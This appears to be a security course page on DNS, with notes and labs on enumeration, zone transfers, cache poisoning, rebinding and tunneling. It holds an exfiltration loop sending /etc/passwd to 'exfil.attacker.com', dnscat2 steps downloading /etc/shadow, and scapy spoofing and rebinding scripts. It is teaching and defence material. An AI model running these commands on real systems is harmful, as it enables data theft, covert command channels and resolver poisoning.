@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | DNS</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>DNS</h1>
+    <hr>
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ==================== NOTES TAB ==================== -->
+      <div class="tab-content active" id="notes">
+
+        <!-- DNS Protocol Overview -->
+        <h2>DNS Protocol</h2>
+        <ul>
+          <li>Operates on <strong>UDP port 53</strong> (queries) and <strong>TCP port 53</strong> (zone transfers, large responses)</li>
+          <li>Hierarchical, distributed naming system — translates domain names to IP addresses</li>
+          <li>DNS hierarchy: Root (<code>.</code>) → TLD (<code>.com</code>) → Authoritative (<code>example.com</code>)</li>
+          <li>Responses are cached at multiple levels (browser, OS resolver, recursive resolver)</li>
+          <li>DNS is <strong>unencrypted by default</strong> — queries/responses visible to anyone on the path</li>
+        </ul>
+
+        <!-- DNS Resolution Flow -->
+        <h2>DNS Resolution Flow</h2>
+<pre><code class="language-bash"># Recursive resolution path:
+# 1. Client checks local cache (/etc/hosts, OS cache)
+# 2. Query sent to recursive resolver (ISP or configured DNS like 8.8.8.8)
+# 3. Resolver queries root nameserver → gets TLD NS referral
+# 4. Resolver queries TLD nameserver (.com) → gets authoritative NS referral
+# 5. Resolver queries authoritative nameserver → gets final answer
+# 6. Answer cached at resolver (respects TTL) and returned to client
+
+# Iterative vs Recursive:
+#   Recursive  — resolver does all the work, client gets final answer
+#   Iterative  — each server refers to the next, client follows the chain</code></pre>
+
+        <!-- Record Types -->
+        <h2>DNS Record Types</h2>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Record</th><th>Purpose</th><th>Example</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><code>A</code></td><td>Maps domain → IPv4 address</td><td><code>example.com → 93.184.216.34</code></td></tr>
+            <tr><td><code>AAAA</code></td><td>Maps domain → IPv6 address</td><td><code>example.com → 2606:2800:220:1:...</code></td></tr>
+            <tr><td><code>CNAME</code></td><td>Alias — points domain to another domain</td><td><code>www.example.com → example.com</code></td></tr>
+            <tr><td><code>MX</code></td><td>Mail server for the domain (with priority)</td><td><code>example.com → 10 mail.example.com</code></td></tr>
+            <tr><td><code>NS</code></td><td>Authoritative nameserver for the zone</td><td><code>example.com → ns1.example.com</code></td></tr>
+            <tr><td><code>TXT</code></td><td>Arbitrary text (SPF, DKIM, domain verification)</td><td><code>"v=spf1 include:_spf.google.com ~all"</code></td></tr>
+            <tr><td><code>PTR</code></td><td>Reverse lookup — IP → domain</td><td><code>34.216.184.93.in-addr.arpa → example.com</code></td></tr>
+            <tr><td><code>SOA</code></td><td>Start of Authority — zone metadata (primary NS, serial, refresh timers)</td><td><code>ns1.example.com admin.example.com 2024010101 ...</code></td></tr>
+            <tr><td><code>SRV</code></td><td>Service location (priority, weight, port, target)</td><td><code>_sip._tcp.example.com → 10 60 5060 sip.example.com</code></td></tr>
+          </tbody>
+        </table>
+
+        <!-- DNS Enumeration Tools -->
+        <h2>DNS Enumeration Tools</h2>
+
+        <h3>dig</h3>
+<pre><code class="language-bash"># Basic query
+dig example.com
+
+# Query specific record type
+dig example.com A
+dig example.com AAAA
+dig example.com MX
+dig example.com NS
+dig example.com TXT
+dig example.com SOA
+dig example.com ANY          # Request all records (often blocked)
+
+# Short output
+dig +short example.com
+
+# Use a specific nameserver
+dig @8.8.8.8 example.com
+
+# Reverse lookup
+dig -x 93.184.216.34
+
+# Trace resolution path (iterative from root)
+dig +trace example.com
+
+# No recursion (query authoritative only)
+dig +norecurse example.com @ns1.example.com
+
+# Show just the answer section
+dig +noall +answer example.com</code></pre>
+
+        <h3>nslookup</h3>
+<pre><code class="language-bash"># Basic lookup
+nslookup example.com
+
+# Specify record type
+nslookup -type=MX example.com
+nslookup -type=NS example.com
+nslookup -type=TXT example.com
+
+# Use specific DNS server
+nslookup example.com 8.8.8.8
+
+# Reverse lookup
+nslookup 93.184.216.34</code></pre>
+
+        <h3>host</h3>
+<pre><code class="language-bash"># Quick lookup
+host example.com
+
+# Specific record type
+host -t MX example.com
+host -t NS example.com
+host -t TXT example.com
+
+# Reverse lookup
+host 93.184.216.34
+
+# Verbose output
+host -v example.com</code></pre>
+
+        <h3>dnsenum</h3>
+<pre><code class="language-bash"># Full DNS enumeration (brute force subdomains, zone transfer attempt, reverse lookups)
+dnsenum example.com
+
+# With custom wordlist
+dnsenum --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt example.com
+
+# Specify threads
+dnsenum --threads 50 example.com</code></pre>
+
+        <h3>dnsrecon</h3>
+<pre><code class="language-bash"># Standard enumeration
+dnsrecon -d example.com
+
+# Zone transfer attempt
+dnsrecon -d example.com -t axfr
+
+# Brute force subdomains
+dnsrecon -d example.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Reverse lookup range
+dnsrecon -r 192.168.1.0/24
+
+# SRV record enumeration
+dnsrecon -d example.com -t srv
+
+# Cache snooping
+dnsrecon -t snoop -n 8.8.8.8 -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre>
+
+        <!-- Subdomain Enumeration -->
+        <h2>Subdomain Enumeration</h2>
+<pre><code class="language-bash"># Passive — no direct queries to target
+# amass (OWASP)
+amass enum -passive -d example.com
+
+# subfinder
+subfinder -d example.com -silent
+
+# Active brute force
+# gobuster dns mode
+gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
+
+# ffuf for virtual host discovery
+ffuf -u http://example.com -H "Host: FUZZ.example.com" \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -fc 301,302
+
+# Manual bash one-liner
+for sub in $(cat wordlist.txt); do
+  host "$sub.example.com" | grep "has address" && echo "[+] $sub.example.com"
+done</code></pre>
+
+        <!-- Zone Transfers -->
+        <h2>Zone Transfers (AXFR)</h2>
+        <ul>
+          <li>Zone transfer replicates the entire DNS zone from primary → secondary nameserver</li>
+          <li>Misconfigured servers allow <strong>anyone</strong> to request a full zone transfer — leaks all records</li>
+          <li>AXFR = full transfer, IXFR = incremental transfer</li>
+        </ul>
+<pre><code class="language-bash"># Attempt zone transfer with dig
+dig axfr example.com @ns1.example.com
+
+# With host
+host -t axfr example.com ns1.example.com
+
+# With nslookup
+nslookup
+> server ns1.example.com
+> set type=any
+> ls -d example.com
+
+# Automated with dnsrecon
+dnsrecon -d example.com -t axfr
+
+# First, find the nameservers
+dig NS example.com +short
+# Then try AXFR against each one</code></pre>
+
+        <!-- Local DNS Configuration -->
+        <h2>Local DNS Configuration</h2>
+<pre><code class="language-bash"># /etc/hosts — static hostname-to-IP mappings (checked before DNS)
+# Format: IP    hostname [aliases...]
+127.0.0.1       localhost
+10.10.14.5      target.htb admin.target.htb
+# Useful for HTB/CTF to map .htb domains
+
+# /etc/resolv.conf — DNS resolver configuration
+nameserver 8.8.8.8         # Primary DNS server
+nameserver 8.8.4.4         # Fallback DNS server
+search example.com         # Default search domain
+# "search" appends domain to short hostnames: ping web → ping web.example.com
+
+# Flush DNS cache
+# systemd-resolved
+sudo systemd-resolve --flush-caches
+# nscd
+sudo nscd -i hosts
+# Check current DNS config
+resolvectl status</code></pre>
+
+        <!-- DNS over HTTPS / TLS -->
+        <h2>DNS over HTTPS (DoH) / DNS over TLS (DoT)</h2>
+        <ul>
+          <li><strong>DoT</strong> — DNS queries encrypted with TLS, port <code>853</code>. Easy to block (distinct port).</li>
+          <li><strong>DoH</strong> — DNS queries sent as HTTPS requests to port <code>443</code>. Hard to distinguish from normal web traffic.</li>
+          <li>Both prevent eavesdropping/tampering of DNS queries in transit</li>
+          <li><strong>Red team note:</strong> DoH can be used for covert C2 channels since it blends with HTTPS traffic</li>
+        </ul>
+<pre><code class="language-bash"># Query via DoH with curl
+curl -s "https://dns.google/resolve?name=example.com&amp;type=A" | python3 -m json.tool
+
+# Using kdig (knot-dns-utils)
+kdig -d @8.8.8.8 +tls-ca example.com       # DoT
+kdig -d @8.8.8.8 +https example.com         # DoH</code></pre>
+
+        <!-- DNS Cache Poisoning -->
+        <h2>DNS Cache Poisoning</h2>
+        <ul>
+          <li>Attacker injects forged DNS responses into a resolver's cache</li>
+          <li>Victims querying the poisoned resolver get redirected to attacker-controlled IPs</li>
+          <li><strong>Kaminsky attack:</strong> Flood resolver with spoofed responses for a random subdomain, include a malicious NS record in the authority section to hijack the entire zone</li>
+          <li>Mitigations: DNSSEC (cryptographic signatures), source port randomization, 0x20 encoding (mixed case query names), response rate limiting</li>
+        </ul>
+<pre><code class="language-bash"># Check if resolver is vulnerable to cache poisoning
+# Low source port entropy = vulnerable
+dig +short porttest.dns-oarc.net TXT @target-resolver
+# Result: "x.x.x.x is GOOD/POOR: 26 queries in y seconds from z ports"
+
+# DNSSEC validation check
+dig example.com +dnssec +short
+dig . DNSKEY +short    # Root zone DNSSEC keys</code></pre>
+
+        <!-- DNS Rebinding -->
+        <h2>DNS Rebinding</h2>
+        <ul>
+          <li>Bypass same-origin policy by manipulating DNS TTL</li>
+          <li>Step 1: Victim visits attacker's domain (e.g., <code>evil.com</code>) which resolves to attacker IP</li>
+          <li>Step 2: JavaScript loaded. DNS TTL set very low (e.g., 0 or 1 second)</li>
+          <li>Step 3: Attacker's DNS server re-binds <code>evil.com</code> to an internal IP (e.g., <code>192.168.1.1</code>)</li>
+          <li>Step 4: Subsequent JS requests to <code>evil.com</code> now hit the internal service — browser thinks it's same-origin</li>
+          <li>Used to access internal services (routers, cloud metadata at <code>169.254.169.254</code>, etc.)</li>
+        </ul>
+<pre><code class="language-bash"># Tools for DNS rebinding
+# rbndr — quick rebinding DNS server
+# https://github.com/taviso/rbndr
+
+# singularity — full DNS rebinding attack framework
+# https://github.com/nccgroup/singularity</code></pre>
+
+        <!-- DNS Tunneling / Exfiltration -->
+        <h2>DNS Tunneling &amp; Exfiltration</h2>
+        <ul>
+          <li>Encapsulate arbitrary data inside DNS queries/responses to bypass firewalls</li>
+          <li>Works because DNS traffic is almost never blocked — even restrictive networks allow it</li>
+          <li>Data encoded in subdomain labels: <code>dGVzdA.exfil.attacker.com</code> (base32/base64/hex encoded)</li>
+          <li>Attacker controls the authoritative NS for <code>attacker.com</code> → receives all queries for subdomains</li>
+        </ul>
+
+        <h3>Exfiltration</h3>
+<pre><code class="language-bash"># Manual DNS exfiltration — encode data in subdomain queries
+# On target (victim):
+data=$(cat /etc/passwd | base64 -w 0)
+# Split into 63-char labels (DNS label max length)
+echo "$data" | fold -w 63 | while read chunk; do
+  nslookup "$chunk.exfil.attacker.com"
+done
+
+# On attacker: run tcpdump or custom DNS server to capture incoming queries
+sudo tcpdump -i eth0 -n port 53 | grep exfil</code></pre>
+
+        <h3>Tunneling Tools</h3>
+<pre><code class="language-bash"># iodine — IP-over-DNS tunnel (full network tunnel)
+# Server (attacker, must be authoritative NS for tunnel domain)
+sudo iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
+
+# Client (victim/target)
+sudo iodine -f -P password tunnel.attacker.com
+# Creates a tun0 interface — route traffic through it
+
+# dnscat2 — C2 channel over DNS
+# Server
+ruby dnscat2.rb tunnel.attacker.com
+
+# Client
+./dnscat tunnel.attacker.com
+
+# DNScat2 gives you a command shell, file upload/download, port forwarding</code></pre>
+
+        <h3>Detection</h3>
+<pre><code class="language-bash"># Signs of DNS tunneling:
+# - Unusually long subdomain labels (close to 63 char max)
+# - High volume of DNS queries to a single domain
+# - TXT record responses with large payloads
+# - High entropy in subdomain names (base64/hex encoded data)
+# - Uncommon record types (NULL, PRIVATE)
+
+# Quick detection with query length analysis
+tcpdump -i eth0 -nn port 53 -l | awk '{print length, $0}' | sort -rn | head</code></pre>
+
+      </div>
+
+      <!-- ==================== LAB TAB ==================== -->
+      <div class="tab-content" id="lab">
+
+        <!-- Lab 1 -->
+        <div class="lab-card">
+          <h4>Lab 1: DNS Enumeration with dig</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use dig to enumerate DNS records for a target domain. Query all major record types and trace the full resolution path.</p>
+
+          <h5>Setup</h5>
+<pre><code class="language-bash"># Use a public domain you control, or practice against intentionally vulnerable targets:
+# - zonetransfer.me (allows zone transfers)
+# - scanme.nmap.org (Nmap's test target)
+# Ensure dig is installed
+which dig || sudo apt install dnsutils</code></pre>
+
+          <h5>Step 1: Query all record types</h5>
+<pre><code class="language-bash"># A records
+dig +short zonetransfer.me A
+
+# Mail servers
+dig +short zonetransfer.me MX
+
+# Nameservers
+dig +short zonetransfer.me NS
+
+# TXT records (look for SPF, DKIM, verification tokens)
+dig +short zonetransfer.me TXT
+
+# SOA record
+dig +short zonetransfer.me SOA
+
+# IPv6
+dig +short zonetransfer.me AAAA</code></pre>
+
+          <h5>Step 2: Trace resolution</h5>
+<pre><code class="language-bash"># Follow the full resolution chain from root servers
+dig +trace zonetransfer.me
+
+# Compare with non-recursive query to authoritative server
+NS=$(dig +short zonetransfer.me NS | head -1)
+dig +norecurse zonetransfer.me @$NS</code></pre>
+
+          <h5>Step 3: Reverse lookups</h5>
+<pre><code class="language-bash"># Get IP first
+IP=$(dig +short zonetransfer.me A | head -1)
+dig -x $IP
+
+# Check PTR record
+host $IP</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Write a bash script that takes a domain and queries all record types automatically</li>
+            <li>Compare results between <code>dig</code>, <code>host</code>, and <code>nslookup</code> for the same domain</li>
+            <li>Use <code>dig +trace</code> and identify each nameserver in the chain</li>
+          </ul>
+        </div>
+
+        <!-- Lab 2 -->
+        <div class="lab-card">
+          <h4>Lab 2: Zone Transfer Attack</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Perform an AXFR zone transfer against a misconfigured nameserver. Extract all DNS records from the zone and identify interesting subdomains.</p>
+
+          <h5>Setup</h5>
+<pre><code class="language-bash"># zonetransfer.me is intentionally configured to allow AXFR
+# Find its nameservers first
+dig NS zonetransfer.me +short</code></pre>
+
+          <h5>Step 1: Attempt zone transfer</h5>
+<pre><code class="language-bash"># Try AXFR against each nameserver
+dig axfr zonetransfer.me @nsztm1.digi.ninja
+dig axfr zonetransfer.me @nsztm2.digi.ninja
+
+# Alternative with host
+host -t axfr zonetransfer.me nsztm1.digi.ninja</code></pre>
+
+          <h5>Step 2: Parse the results</h5>
+<pre><code class="language-bash"># Extract just hostnames and IPs from zone transfer
+dig axfr zonetransfer.me @nsztm1.digi.ninja | grep -E "IN\s+A\s+" | awk '{print $1, $5}'
+
+# Look for interesting records
+dig axfr zonetransfer.me @nsztm1.digi.ninja | grep -iE "admin|dev|staging|internal|vpn|mail|ftp"</code></pre>
+
+          <h5>Step 3: Automate with Python</h5>
+<pre><code class="language-python">import dns.zone
+import dns.query
+import dns.rdatatype
+
+domain = "zonetransfer.me"
+ns = "nsztm1.digi.ninja"
+
+try:
+    zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
+    print(f"[+] Zone transfer successful for {domain}\n")
+
+    for name, node in zone.nodes.items():
+        rdatasets = node.rdatasets
+        for rdataset in rdatasets:
+            print(f"{name}.{domain}  {dns.rdatatype.to_text(rdataset.rdtype)}  "
+                  f"{' '.join(str(r) for r in rdataset)}")
+except dns.exception.FormError:
+    print("[-] Zone transfer refused")
+except Exception as e:
+    print(f"[-] Error: {e}")</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Extend the Python script to output results in CSV format</li>
+            <li>Try AXFR against your own DNS servers or HTB machines to practice</li>
+            <li>Compare <code>dig axfr</code> output with <code>dnsrecon -d example.com -t axfr</code></li>
+          </ul>
+        </div>
+
+        <!-- Lab 3 -->
+        <div class="lab-card">
+          <h4>Lab 3: DNS Tunneling with iodine &amp; dnscat2</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Set up a DNS tunnel to exfiltrate data and establish a C2 channel through DNS traffic. Use iodine for IP-over-DNS and dnscat2 for command and control.</p>
+
+          <h5>Setup</h5>
+<pre><code class="language-bash"># You need:
+# - A domain you control (e.g., attacker.com)
+# - NS record pointing a subdomain to your server:
+#     tunnel.attacker.com  NS  ns1.attacker.com
+#     ns1.attacker.com     A   YOUR_SERVER_IP
+# - Two machines: attacker (server) and victim (client)
+
+# Install tools
+sudo apt install iodine    # IP-over-DNS
+# dnscat2: https://github.com/iagox86/dnscat2</code></pre>
+
+          <h5>Part A: iodine (IP-over-DNS Tunnel)</h5>
+<pre><code class="language-bash"># Attacker (server) — start iodine server
+sudo iodined -f -c -P s3cretpass 10.0.0.1/24 tunnel.attacker.com
+# -f = foreground, -c = disable client IP check, -P = password
+# 10.0.0.1/24 = tunnel subnet
+
+# Victim (client) — connect to tunnel
+sudo iodine -f -P s3cretpass tunnel.attacker.com
+# This creates a dns0 interface with IP 10.0.0.2
+
+# Verify tunnel
+ping 10.0.0.1    # From client → should reach server through DNS
+
+# Now you can SSH, transfer files, proxy traffic through the tunnel
+ssh user@10.0.0.1
+# Or set up a SOCKS proxy
+ssh -D 1080 user@10.0.0.1</code></pre>
+
+          <h5>Part B: dnscat2 (C2 over DNS)</h5>
+<pre><code class="language-bash"># Attacker (server)
+ruby dnscat2.rb tunnel.attacker.com
+# Note the secret key displayed
+
+# Victim (client)
+./dnscat --secret=YOUR_SECRET tunnel.attacker.com
+
+# In dnscat2 server console:
+# List sessions
+sessions
+
+# Interact with a session
+session -i 1
+
+# Execute commands
+exec cmd.exe     # Windows
+exec /bin/bash   # Linux
+
+# Download a file
+download /etc/shadow /tmp/shadow.txt
+
+# Upload a file
+upload payload.exe C:\Windows\Temp\payload.exe</code></pre>
+
+          <h5>Detection &amp; Analysis</h5>
+<pre><code class="language-bash"># On the server, capture DNS tunnel traffic for analysis
+sudo tcpdump -i eth0 -nn port 53 -w dns_tunnel.pcap
+
+# Analyze in Wireshark — look for:
+# - NULL/TXT/CNAME queries with encoded data in subdomains
+# - High query volume to a single domain
+# - Large TXT responses
+
+# Check iodine encoding type
+# iodine tries: raw, base128, base64, base32 — uses the best one the network allows</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Measure tunnel throughput with <code>iperf3</code> through the iodine tunnel vs a direct connection</li>
+            <li>Capture tunnel traffic with Wireshark and identify the encoded data in DNS queries</li>
+            <li>Write a firewall rule that detects/blocks DNS tunneling based on query length</li>
+          </ul>
+        </div>
+
+        <!-- Lab 4 -->
+        <div class="lab-card">
+          <h4>Lab 4: DNS Cache Poisoning Simulation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Simulate a Kaminsky-style DNS cache poisoning attack in a controlled lab. Race the legitimate response with spoofed answers.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Lab setup: local DNS resolver (unbound/bind) forwarding to real DNS
+# Configure unbound to listen on 127.0.0.1:53
+sudo apt install unbound
+echo 'server:
+  interface: 127.0.0.1
+  access-control: 127.0.0.0/8 allow
+  do-not-query-localhost: no
+forward-zone:
+  name: "."
+  forward-addr: 8.8.8.8' | sudo tee /etc/unbound/unbound.conf.d/lab.conf
+sudo systemctl restart unbound</code></pre>
+<pre><code class="language-python">from scapy.all import *
+import random
+
+target_resolver = "127.0.0.1"
+domain = "poisoned.example.com"
+fake_ip = "6.6.6.6"
+auth_ns = "ns1.example.com"
+
+# Flood spoofed DNS responses trying to beat the real one
+for txid in range(1, 65535):
+    spoofed = IP(src="8.8.8.8", dst=target_resolver) / \
+              UDP(sport=53, dport=random.randint(1024, 65535)) / \
+              DNS(id=txid, qr=1, aa=1, qd=DNSQR(qname=domain),
+                  an=DNSRR(rrname=domain, rdata=fake_ip, ttl=86400),
+                  ns=DNSRR(rrname="example.com", type="NS",
+                           rdata=auth_ns, ttl=86400))
+    send(spoofed, verbose=0)
+
+# Verify: dig @127.0.0.1 poisoned.example.com — should return 6.6.6.6</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 5 -->
+        <div class="lab-card">
+          <h4>Lab 5: DNS Rebinding Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Set up a DNS rebinding attack that initially resolves to your server, then switches to 127.0.0.1 to bypass same-origin restrictions.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Minimal DNS server that alternates between external and internal IPs
+from scapy.all import *
+import threading
+
+external_ip = "YOUR_SERVER_IP"
+internal_ip = "127.0.0.1"
+request_count = {}
+
+def dns_responder(pkt):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname.decode()
+        count = request_count.get(qname, 0)
+        request_count[qname] = count + 1
+
+        # First request → external (loads attacker page)
+        # Second request → internal (bypasses SOP)
+        rdata = external_ip if count == 0 else internal_ip
+
+        resp = IP(dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=53) / \
+               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                   an=DNSRR(rrname=qname, rdata=rdata, ttl=0))  # TTL=0 forces re-query
+        send(resp, verbose=0)
+        print(f"[+] {qname} → {rdata} (request #{count+1})")
+
+sniff(filter="udp port 53", prn=dns_responder, store=0)</code></pre>
+<pre><code class="language-bash"># Test: configure victim browser to use your DNS
+# 1. Browse to http://rebind.yourdomain.com (loads attacker JS)
+# 2. JS waits for DNS TTL to expire
+# 3. JS makes XMLHttpRequest to same domain → now resolves to 127.0.0.1
+# 4. Browser sends request to localhost, attacker JS reads response</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 6 -->
+        <div class="lab-card">
+          <h4>Lab 6: Subdomain Brute Force Script</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write a multi-threaded subdomain brute-forcer from scratch using Python's dns.resolver module.</p>
+          <div class="setup-code">
+<pre><code class="language-python">#!/usr/bin/env python3
+import dns.resolver
+import threading
+from queue import Queue
+import sys
+
+domain = sys.argv[1] if len(sys.argv) > 1 else "example.com"
+wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+threads = 50
+found = []
+lock = threading.Lock()
+q = Queue()
+
+def worker():
+    resolver = dns.resolver.Resolver()
+    resolver.timeout = 2
+    resolver.lifetime = 2
+    while not q.empty():
+        sub = q.get()
+        fqdn = f"{sub}.{domain}"
+        try:
+            answers = resolver.resolve(fqdn, "A")
+            ips = [str(r) for r in answers]
+            with lock:
+                found.append((fqdn, ips))
+                print(f"[+] {fqdn} → {', '.join(ips)}")
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
+                dns.resolver.NoNameservers, dns.exception.Timeout):
+            pass
+        q.task_done()
+
+with open(wordlist) as f:
+    for line in f:
+        q.put(line.strip())
+
+print(f"[*] Brute-forcing {domain} with {q.qsize()} words, {threads} threads")
+for _ in range(threads):
+    threading.Thread(target=worker, daemon=True).start()
+q.join()
+print(f"\n[+] Found {len(found)} subdomains")</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 7 -->
+        <div class="lab-card">
+          <h4>Lab 7: Passive DNS Reconnaissance</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use passive DNS sources to discover subdomains and historical records without sending any queries to the target.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Certificate Transparency logs
+curl -s "https://crt.sh/?q=%.example.com&amp;output=json" | \
+  python3 -c "import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]" | \
+  sort -u
+
+# SecurityTrails API (free tier)
+curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains" \
+  -H "APIKEY: YOUR_KEY" | python3 -m json.tool
+
+# Wayback Machine for historical subdomains
+curl -s "https://web.archive.org/cdx/search/cdx?url=*.example.com&amp;output=text&amp;fl=original" | \
+  awk -F/ '{print $3}' | sort -u
+
+# Combine multiple sources
+# subfinder pulls from 30+ passive sources
+subfinder -d example.com -silent | sort -u
+
+# amass passive mode
+amass enum -passive -d example.com</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 8 -->
+        <div class="lab-card">
+          <h4>Lab 8: DNS over HTTPS (DoH) Analysis</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Make DNS queries over HTTPS and analyze the encrypted DNS traffic vs. plaintext DNS in Wireshark.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># DoH query with curl (Cloudflare)
+curl -s -H "accept: application/dns-json" \
+  "https://cloudflare-dns.com/dns-query?name=example.com&amp;type=A" | python3 -m json.tool
+
+# DoH query with curl (Google)
+curl -s "https://dns.google/resolve?name=example.com&amp;type=A" | python3 -m json.tool
+
+# DoH with wire format (RFC 8484)
+echo -n "AAABAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE=" | base64 -d | \
+  curl -s -H "content-type: application/dns-message" \
+  --data-binary @- "https://cloudflare-dns.com/dns-query" | xxd</code></pre>
+<pre><code class="language-python">import requests
+import base64
+import struct
+
+# JSON API
+r = requests.get("https://cloudflare-dns.com/dns-query",
+    params={"name": "example.com", "type": "A"},
+    headers={"accept": "application/dns-json"})
+print(r.json())
+
+# Compare: capture both plaintext DNS and DoH in Wireshark
+# Plaintext: visible query/response at UDP 53
+# DoH: encrypted inside TLS to port 443 — only see HTTPS to dns server IP</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 9 -->
+        <div class="lab-card">
+          <h4>Lab 9: DNSSEC Validation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Query DNSSEC-signed domains, verify the chain of trust from root to domain, and detect when validation fails.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Check if a domain has DNSSEC
+dig +dnssec example.com A
+# Look for RRSIG records in the answer and 'ad' flag in header
+
+# View DNSKEY records
+dig DNSKEY example.com +short
+
+# View DS records (at parent zone)
+dig DS example.com +short
+
+# Trace the full chain of trust
+dig +sigchase +trusted-key=/etc/trusted-key.key example.com A
+
+# Validate with drill
+drill -S example.com
+
+# Test with a known DNSSEC failure
+dig @8.8.8.8 dnssec-failed.org A    # Should return SERVFAIL
+dig @8.8.8.8 +cd dnssec-failed.org A # CD flag bypasses validation</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 10 -->
+        <div class="lab-card">
+          <h4>Lab 10: Reverse DNS Mapping</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Map an IP range to hostnames using reverse DNS (PTR) lookups to discover infrastructure.</p>
+          <div class="setup-code">
+<pre><code class="language-python">#!/usr/bin/env python3
+import dns.resolver
+import dns.reversename
+import ipaddress
+import sys
+
+subnet = sys.argv[1] if len(sys.argv) > 1 else "93.184.216.0/24"
+network = ipaddress.ip_network(subnet)
+resolver = dns.resolver.Resolver()
+resolver.timeout = 2
+
+print(f"[*] Reverse DNS scan: {subnet}")
+for ip in network.hosts():
+    try:
+        rev_name = dns.reversename.from_address(str(ip))
+        answers = resolver.resolve(rev_name, "PTR")
+        for rdata in answers:
+            print(f"  {str(ip):15s} → {rdata}")
+    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
+            dns.resolver.NoNameservers, dns.exception.Timeout):
+        pass</code></pre>
+<pre><code class="language-bash"># Quick bash reverse DNS scan
+for i in $(seq 1 254); do
+  host 93.184.216.$i 2>/dev/null | grep "domain name pointer" &amp;
+done
+wait</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 11 -->
+        <div class="lab-card">
+          <h4>Lab 11: DNS Amplification Analysis</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Understand DNS amplification attacks by measuring response-to-query size ratios. Analyze a pcap of an amplification attack.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Measure amplification factor for different query types
+for qtype in ANY TXT NS MX SOA DNSKEY; do
+  QSIZE=$(dig +noall +answer +stats $qtype example.com | grep "MSG SIZE" | awk '{print $NF}')
+  echo "$qtype response size: $QSIZE bytes"
+done
+
+# A typical query is ~40 bytes; ANY response can be 2000+
+# Amplification factor = response_size / query_size</code></pre>
+<pre><code class="language-python">from scapy.all import *
+
+# Analyze amplification pcap
+pkts = rdpcap("dns_amplification.pcap")
+
